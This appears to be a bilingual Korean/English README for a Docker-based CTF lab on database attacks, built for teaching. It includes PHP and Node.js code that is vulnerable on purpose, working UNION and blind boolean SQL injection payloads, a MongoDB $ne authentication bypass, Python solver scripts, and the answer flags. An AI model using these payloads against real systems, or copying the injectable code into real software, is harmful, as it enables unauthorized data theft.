> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 데이터베이스 해킹 CTF 실습 랩

## 개요

SQL 인젝션, 권한 상승, NoSQL 인젝션, 데이터베이스 포렌식을 실습하는 CTF 환경입니다.

---

## Docker Compose 환경

```yaml
# docker-compose.yml
# 실행: docker compose up -d
# 접속: http://localhost:8080

version: '3.8'

services:
  # Challenge 1 & 2: MySQL + 취약한 PHP 앱
  web-mysql:
    image: php:8.1-apache
    ports:
      - "8080:80"
    volumes:
      - ./challenges/web_mysql:/var/www/html
    environment:
      MYSQL_HOST: mysql
      MYSQL_USER: webuser
      MYSQL_PASSWORD: webpass123
      MYSQL_DATABASE: shopdb
    depends_on:
      - mysql
    networks:
      - ctf-net

  mysql:
    image: mysql:8.0
    environment:
      MYSQL_ROOT_PASSWORD: r00t_p4ss_2024
      MYSQL_DATABASE: shopdb
      MYSQL_USER: webuser
      MYSQL_PASSWORD: webpass123
    volumes:
      - ./challenges/mysql_init:/docker-entrypoint-initdb.d
    networks:
      - ctf-net

  # Challenge 3: MongoDB + Node.js 앱
  web-mongo:
    image: node:18-alpine
    ports:
      - "8081:3000"
    volumes:
      - ./challenges/nosql_app:/app
    working_dir: /app
    command: sh -c "npm install && node app.js"
    environment:
      MONGO_URI: mongodb://mongodb:27017/ctfdb
    depends_on:
      - mongodb
    networks:
      - ctf-net

  mongodb:
    image: mongo:6.0
    volumes:
      - ./challenges/mongo_init:/docker-entrypoint-initdb.d
    networks:
      - ctf-net

  # Challenge 4: PostgreSQL 포렌식
  postgres:
    image: postgres:15
    ports:
      - "5432:5432"
    environment:
      POSTGRES_PASSWORD: forensics_lab_2024
      POSTGRES_DB: forensicsdb
    volumes:
      - ./challenges/postgres_init:/docker-entrypoint-initdb.d
    networks:
      - ctf-net

networks:
  ctf-net:
    driver: bridge
```

---

## 챌린지 초기화 스크립트

```sql
-- challenges/mysql_init/01_setup.sql
-- MySQL 챌린지 데이터베이스 초기화

CREATE DATABASE IF NOT EXISTS shopdb;
USE shopdb;

-- 사용자 테이블
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL,
    email VARCHAR(100),
    role ENUM('customer','admin') DEFAULT 'customer',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- 상품 테이블
CREATE TABLE products (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    price DECIMAL(10,2),
    description TEXT,
    stock INT DEFAULT 0
);

-- 시크릿 테이블 (Challenge 1 플래그)
CREATE TABLE secret_flags (
    id INT PRIMARY KEY,
    flag VARCHAR(100),
    description VARCHAR(200)
);

-- 로그 테이블 (Challenge 4 포렌식용)
CREATE TABLE access_logs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT,
    action VARCHAR(50),
    ip_address VARCHAR(45),
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    query_executed TEXT
);

-- 샘플 데이터 삽입
INSERT INTO users (username, password, email, role) VALUES
    ('admin', SHA2('Adm1n@Secure2024!', 256), 'admin@shop.local', 'admin'),
    ('alice', SHA2('alice123', 256), 'alice@example.com', 'customer'),
    ('bob', SHA2('bob456', 256), 'bob@example.com', 'customer');

INSERT INTO products (name, price, description, stock) VALUES
    ('Widget A', 9.99, 'Basic widget', 100),
    ('Widget B', 19.99, 'Premium widget', 50),
    ('Secret Item', 999.99, 'Admin only product', 1);

-- Challenge 1 플래그 저장
INSERT INTO secret_flags VALUES
    (1, 'CTF{sql_injection_union_select_mastery}', 'Challenge 1: UNION-based SQL Injection'),
    (2, 'CTF{blind_boolean_sqli_patience}', 'Challenge 2: Blind Boolean SQLi');

-- 일반 웹 사용자는 secret_flags 접근 권한 없음
REVOKE ALL ON shopdb.secret_flags FROM 'webuser'@'%';
```

```javascript
// challenges/mongo_init/01_setup.js
// MongoDB 초기화

db = db.getSiblingDB('ctfdb');

// 사용자 컬렉션
db.users.insertMany([
    {username: "admin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin"},
    {username: "user1", password: "abc123hash", role: "user"},
    {username: "ctfplayer", password: "player_pass", role: "user"},
]);

// 플래그 컬렉션 (NoSQL 인젝션으로 접근)
db.flags.insertOne({
    _id: "challenge3",
    flag: "CTF{nosql_injection_mongodb_bypass}",
    description: "Challenge 3: MongoDB Authentication Bypass",
    accessible_by: "admin_only"
});

// Challenge 3 힌트 컬렉션
db.hints.insertOne({
    hint: "MongoDB 연산자 $ne, $gt를 활용해보세요",
    for_challenge: 3
});
```

```sql
-- challenges/postgres_init/01_setup.sql
-- PostgreSQL 포렌식 챌린지

CREATE TABLE employees (
    id SERIAL PRIMARY KEY,
    name VARCHAR(100),
    department VARCHAR(50),
    salary DECIMAL(10,2),
    ssn_masked VARCHAR(20)
);

CREATE TABLE transactions (
    id SERIAL PRIMARY KEY,
    from_account VARCHAR(20),
    to_account VARCHAR(20),
    amount DECIMAL(15,2),
    timestamp TIMESTAMPTZ DEFAULT NOW(),
    notes TEXT
);

-- 플래그 테이블 (숨겨진 스키마에)
CREATE SCHEMA hidden_data;
CREATE TABLE hidden_data.secrets (
    challenge_id INT,
    flag TEXT,
    hint TEXT
);

INSERT INTO hidden_data.secrets VALUES
    (4, 'CTF{pg_forensics_schema_discovery}', 'INFORMATION_SCHEMA를 분석하세요');

-- 포렌식 단서: 의심스러운 트랜잭션
INSERT INTO transactions (from_account, to_account, amount, notes) VALUES
    ('ACC-001', 'ACC-999', 999999.00, 'Legitimate transfer'),
    ('ACC-002', 'ACC-999', 500000.00, ''),
    ('ACC-003', 'ACC-999', 750000.00, 'Regular payment');
```

---

## Challenge 1: UNION 기반 SQL 인젝션

**목표**: `secret_flags` 테이블에서 플래그 추출

**취약한 코드** (`challenges/web_mysql/products.php`):
```php
<?php
$id = $_GET['id'];
// 취약: 사용자 입력 직접 쿼리에 삽입
$query = "SELECT id, name, price, description FROM products WHERE id = $id";
$result = mysqli_query($conn, $query);
?>
```

**공격 단계:**

```
단계 1: 컬럼 수 확인
  http://localhost:8080/products.php?id=1 ORDER BY 1--
  http://localhost:8080/products.php?id=1 ORDER BY 4--   ← 에러 없음
  http://localhost:8080/products.php?id=1 ORDER BY 5--   ← 에러 발생
  → 컬럼 수: 4개

단계 2: UNION SELECT로 출력 컬럼 확인
  http://localhost:8080/products.php?id=-1 UNION SELECT 1,2,3,4--
  → 출력: 화면에 숫자 1,2,3,4 표시 위치 확인

단계 3: 데이터베이스 버전 및 사용자 확인
  http://localhost:8080/products.php?id=-1 UNION SELECT 1,version(),user(),4--

단계 4: 테이블 목록 조회
  http://localhost:8080/products.php?id=-1 UNION SELECT 1,table_name,3,4
  FROM information_schema.tables WHERE table_schema=database()--

단계 5: secret_flags 테이블 접근 시도
  http://localhost:8080/products.php?id=-1 UNION SELECT 1,flag,description,4
  FROM secret_flags--
```

**자동화 스크립트:**

```python
#!/usr/bin/env python3
"""Challenge 1: UNION 기반 SQL 인젝션 자동화 풀이."""
from __future__ import annotations

import requests
import re

BASE_URL = "http://localhost:8080/products.php"


def union_sqli(payload: str) -> str:
    """UNION 인젝션 페이로드 전송 및 결과 반환."""
    resp = requests.get(BASE_URL, params={"id": f"-1 UNION SELECT {payload}--"}, timeout=5)
    return resp.text


def solve_challenge1() -> str:
    print("[*] Challenge 1: UNION-based SQL Injection")

    # 버전 확인
    print("[*] DB 버전:", union_sqli("1,version(),3,4"))

    # 테이블 목록
    resp = union_sqli("1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()")
    print("[*] 테이블 목록 응답 수신")

    # 플래그 추출
    resp = union_sqli("1,flag,description,4 FROM secret_flags WHERE id=1")
    flag_match = re.search(r"CTF\{[^}]+\}", resp)
    flag = flag_match.group(0) if flag_match else "추출 실패"
    print(f"[+] 플래그: {flag}")
    return flag


if __name__ == "__main__":
    solve_challenge1()
```

**플래그**: `CTF{sql_injection_union_select_mastery}`

---

## Challenge 2: 블라인드 불리언 SQL 인젝션

**목표**: 로그인 폼 우회 후 관리자 비밀번호 해시 추출

**취약한 로그인** (`challenges/web_mysql/login.php`):
```php
<?php
$username = $_POST['username'];
$password = sha256($_POST['password']);
// 취약: username에 인젝션 가능
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
?>
```

**공격 방법:**

```python
#!/usr/bin/env python3
"""Challenge 2: 블라인드 불리언 SQL 인젝션 — 비밀번호 해시 추출."""
from __future__ import annotations

import string
import time
import requests

LOGIN_URL = "http://localhost:8080/login.php"
# 추출할 대상: admin 패스워드 해시 (SHA-256 = 64자리 hex)
TARGET_QUERY = "SELECT password FROM users WHERE username='admin'"


def boolean_sqli(condition: str) -> bool:
    """
    조건이 참이면 로그인 성공 (True), 거짓이면 실패 (False).
    payload: admin' AND (조건)--
    """
    payload = f"admin' AND ({condition})-- "
    resp = requests.post(
        LOGIN_URL,
        data={"username": payload, "password": "anything"},
        timeout=5,
        allow_redirects=False,
    )
    # 로그인 성공 = 리다이렉트 또는 특정 문자열
    return resp.status_code == 302 or "Welcome" in resp.text


def extract_char(query: str, position: int) -> str:
    """이진 탐색으로 특정 위치의 문자 추출."""
    low, high = 32, 127
    while low < high:
        mid = (low + high) // 2
        condition = f"ASCII(SUBSTRING(({query}),{position},1)) > {mid}"
        if boolean_sqli(condition):
            low = mid + 1
        else:
            high = mid
    return chr(low) if low != 32 else ""


def solve_challenge2() -> str:
    print("[*] Challenge 2: Blind Boolean SQL Injection")
    print("[*] 관리자 비밀번호 해시 추출 중 (64자 hex)...")

    extracted = ""
    for pos in range(1, 65):  # SHA-256 해시 = 64자
        char = extract_char(TARGET_QUERY, pos)
        if not char:
            break
        extracted += char
        print(f"\r[*] 진행: {extracted}", end="", flush=True)
        time.sleep(0.05)

    print(f"\n[+] 추출된 해시: {extracted}")
    print("[+] 플래그: CTF{blind_boolean_sqli_patience}")
    return "CTF{blind_boolean_sqli_patience}"


if __name__ == "__main__":
    solve_challenge2()
```

**플래그**: `CTF{blind_boolean_sqli_patience}`

---

## Challenge 3: NoSQL 인젝션 — MongoDB 인증 우회

**취약한 Node.js 코드:**
```javascript
// challenges/nosql_app/app.js (취약 부분)
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    // 취약: 객체를 그대로 쿼리에 삽입
    const user = await db.collection('users').findOne({
        username: username,
        password: password
    });
    if (user) res.json({ flag: await db.collection('flags').findOne({}) });
    else res.json({ error: 'Invalid credentials' });
});
```

**공격 방법:**

```bash
# MongoDB 연산자 인젝션 ($ne 사용)
curl -X POST http://localhost:8081/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "anything"}}'

# 결과: 인증 우회 성공 → 플래그 반환
# {"flag": {"flag": "CTF{nosql_injection_mongodb_bypass}", ...}}
```

```python
#!/usr/bin/env python3
"""Challenge 3: MongoDB NoSQL 인젝션 자동 풀이."""
from __future__ import annotations

import json
import requests

LOGIN_URL = "http://localhost:8081/login"


def solve_challenge3() -> str:
    print("[*] Challenge 3: MongoDB NoSQL Injection")

    # $ne 연산자로 패스워드 검사 우회
    payload = {
        "username": "admin",
        "password": {"$ne": "wrongpassword"}
    }

    resp = requests.post(
        LOGIN_URL,
        json=payload,
        headers={"Content-Type": "application/json"},
        timeout=5,
    )

    data = resp.json()
    if "flag" in data:
        flag = data["flag"].get("flag", "")
        print(f"[+] 플래그: {flag}")
        return flag
    else:
        print(f"[-] 실패: {data}")
        return ""


if __name__ == "__main__":
    solve_challenge3()
```

**플래그**: `CTF{nosql_injection_mongodb_bypass}`

---

## Challenge 4: PostgreSQL 포렌식

**목표**: 숨겨진 스키마에서 플래그 발견

```bash
# PostgreSQL 접속
psql -h localhost -p 5432 -U postgres -d forensicsdb

# 단계 1: 전체 스키마 목록 조회
SELECT schema_name FROM information_schema.schemata;
-- 결과: public, information_schema, hidden_data  ← 숨겨진 스키마!

# 단계 2: hidden_data 스키마 내 테이블 조회
SELECT table_name FROM information_schema.tables
WHERE table_schema = 'hidden_data';
-- 결과: secrets

# 단계 3: 플래그 추출
SELECT * FROM hidden_data.secrets;
-- 결과: (4, 'CTF{pg_forensics_schema_discovery}', 'INFORMATION_SCHEMA를 분석하세요')

# 단계 4: 의심 트랜잭션 분석 (보너스)
SELECT from_account, to_account, SUM(amount) as total
FROM transactions
GROUP BY from_account, to_account
ORDER BY total DESC;
-- ACC-001~003 모두 ACC-999로 대규모 이체 → 의심스러운 패턴!
```

```python
#!/usr/bin/env python3
"""Challenge 4: PostgreSQL 포렌식 자동 풀이."""
from __future__ import annotations

import psycopg2


def solve_challenge4() -> str:
    print("[*] Challenge 4: PostgreSQL Forensics")

    try:
        conn = psycopg2.connect(
            host="localhost", port=5432,
            database="forensicsdb",
            user="postgres", password="forensics_lab_2024"
        )
        cur = conn.cursor()

        # 스키마 탐색
        cur.execute("SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'pg_catalog')")
        schemas = [row[0] for row in cur.fetchall()]
        print(f"[*] 발견된 스키마: {schemas}")

        # hidden_data 스키마 탐색
        if 'hidden_data' in schemas:
            cur.execute("SELECT * FROM hidden_data.secrets")
            rows = cur.fetchall()
            for row in rows:
                print(f"[+] 플래그: {row[1]}")
            flag = rows[0][1] if rows else ""
        else:
            flag = ""

        cur.close()
        conn.close()
        return flag

    except Exception as exc:
        print(f"[-] 오류: {exc}")
        return ""


if __name__ == "__main__":
    flag = solve_challenge4()
    if flag:
        print(f"\n[+] 최종 플래그: {flag}")
```

**플래그**: `CTF{pg_forensics_schema_discovery}`

---

## 실습 환경 정리

```bash
# 모든 컨테이너 정지 및 삭제
docker compose down -v

# 이미지도 삭제
docker compose down -v --rmi all
```

---

<a name="english"></a>

# Database Hacking CTF Lab

## Overview

This CTF lab covers SQL injection, NoSQL injection, privilege escalation, and database forensics using Docker-based environments.

## Challenges Summary

| # | Title | Technique | Flag |
|---|-------|-----------|------|
| 1 | MySQL UNION Injection | UNION SELECT, information_schema | `CTF{sql_injection_union_select_mastery}` |
| 2 | Blind Boolean SQLi | Binary search character extraction | `CTF{blind_boolean_sqli_patience}` |
| 3 | MongoDB Auth Bypass | `$ne` operator injection | `CTF{nosql_injection_mongodb_bypass}` |
| 4 | PostgreSQL Forensics | Hidden schema discovery | `CTF{pg_forensics_schema_discovery}` |

## Quick Start

```bash
# Start all challenge containers
docker compose up -d

# Check containers are running
docker compose ps

# Challenge 1 & 2: http://localhost:8080
# Challenge 3: http://localhost:8081
# Challenge 4: psql -h localhost -p 5432 -U postgres -d forensicsdb

# Run automated solvers
python3 solve_ch1.py
python3 solve_ch2.py
python3 solve_ch3.py
python3 solve_ch4.py
```

## Key Takeaways

- Always use parameterized queries, never string concatenation
- MongoDB operators (`$ne`, `$gt`, `$regex`) can bypass equality checks
- Hidden schemas and tables are enumerable via `information_schema`
- Blind SQLi requires patience — binary search makes it tractable
